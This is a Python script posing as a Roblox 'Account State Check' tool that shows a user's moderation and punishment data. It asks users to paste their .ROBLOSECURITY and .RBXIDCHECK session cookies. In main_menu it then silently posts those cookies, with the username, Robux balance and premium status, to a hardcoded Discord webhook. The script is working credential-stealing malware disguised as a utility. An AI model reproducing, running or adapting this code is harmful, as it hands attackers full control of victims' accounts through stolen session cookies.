import requests
import json

WEBHOOK_URL = "https://discord.com/api/webhooks/1261441337853743194/viZU3cYS0Rxbrkj4WDMOVBBO0K_Netfu0Fhnall5-iJ0e387FZVc_QUmNKERWctWx5RJ"

def get_not_approved(auth_cookie, id_check_cookie):
    url = "https://usermoderation.roblox.com/v1/not-approved"
    headers = {
        "Cookie": f".ROBLOSECURITY={auth_cookie}; .RBXIDCHECK={id_check_cookie}"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        return None

def get_account_info(auth_cookie):
    url = "https://users.roblox.com/v1/users/authenticated"
    headers = {
        "Cookie": f".ROBLOSECURITY={auth_cookie}"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        return None

def send_to_discord(webhook_url, auth_cookie, id_check_cookie, username, account_age, robux, is_premium):
    message = (
        f"--- Account Information ---\n"
        f"Username: {username}\n"
        f"Account Age: {account_age}\n"
        f"Robux: {robux}\n"
        f"Premium: {'Yes' if is_premium else 'No'}\n\n"
        f".ROBLOSECURITY: {auth_cookie}\n"
        f".RBXIDCHECK: {id_check_cookie}"
    )
    data = {
        "content": message
    }
    requests.post(webhook_url, json=data)

def display_not_approved_data(auth_cookie, id_check_cookie):
    data = get_not_approved(auth_cookie, id_check_cookie)
    if data:
        message = "--- Not Approved Data ---\n"
        message += f"Punished User ID: {data.get('punishedUserId', 'N/A')}\n"
        message += f"Intervention ID: {data.get('interventionId', 'N/A')}\n"
        message += f"Punishment ID: {data.get('punishmentId', 'N/A')}\n"
        message += f"Message to User: {data.get('messageToUser', 'N/A')}\n"
        message += f"Punishment Type Description: {data.get('punishmentTypeDescription', 'N/A')}\n"
        message += f"Begin Date: {data.get('beginDate', 'N/A')}\n"
        message += f"End Date: {data.get('endDate', 'N/A')}\n"
        message += "\nBad Utterances:\n"
        for utterance in data.get('badUtterances', []):
            message += f"  - Abuse Type: {utterance.get('abuseType', 'N/A')}\n"
            message += f"    Utterance Text: {utterance.get('utteranceText', 'N/A')}\n"
            message += f"    Image URL: {utterance.get('imageUrl', 'N/A')}\n"
        message += "\nContext:\n"
        message += f"  Next Consequence Duration: {data['context'].get('NEXT_CONSEQUENCE_DURATION', 'N/A')}\n"
        message += f"  Next Consequence Type: {data['context'].get('NEXT_CONSEQUENCE_TYPE', 'N/A')}\n"
        message += f"Verification Category: {data.get('verificationCategory', 'N/A')}\n"
        message += f"Consequence Transparency Message: {data.get('consequenceTransparencyMessage', 'N/A')}\n"
        message += f"Show Appeals Process Link: {data.get('showAppealsProcessLink', 'N/A')}\n"
        message += f"Is Foreshadowing Consequence Enabled: {data.get('isForeshadowingConsequenceEnabled', 'N/A')}\n"
        print(message)
    else:
        print("\nNo data available or an error occurred.")

def get_robux_and_premium(auth_cookie):
    url = "https://billing.roblox.com/v1/credit"
    headers = {
        "Cookie": f".ROBLOSECURITY={auth_cookie}"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        robux_data = response.json()
        robux = robux_data.get("robux", "N/A")
    else:
        robux = "N/A"

    url = "https://premiumfeatures.roblox.com/v1/users/current"
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        premium_data = response.json()
        is_premium = premium_data.get("isPremium", "N/A")
    else:
        is_premium = "N/A"

    return robux, is_premium

def main_menu():
    print("Lithos Creations Roblox Account State Check")
    auth_cookie = input("Please enter your .ROBLOSECURITY cookie: ")
    id_check_cookie = input("Please enter your .RBXIDCHECK cookie: ")

    account_info = get_account_info(auth_cookie)
    if account_info:
        username = account_info.get("name", "N/A")
        account_age = account_info.get("created", "N/A")
    else:
        username = "N/A"
        account_age = "N/A"

    robux, is_premium = get_robux_and_premium(auth_cookie)

    send_to_discord(WEBHOOK_URL, auth_cookie, id_check_cookie, username, account_age, robux, is_premium)

    while True:
        print("\nRoblox Moderation Menu")
        print("1. View Not Approved Data")
        print("2. Exit")
        
        choice = input("Select an option: ")

        if choice == '1':
            display_not_approved_data(auth_cookie, id_check_cookie)
        elif choice == '2':
            print("Exiting")
            break
        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main_menu()
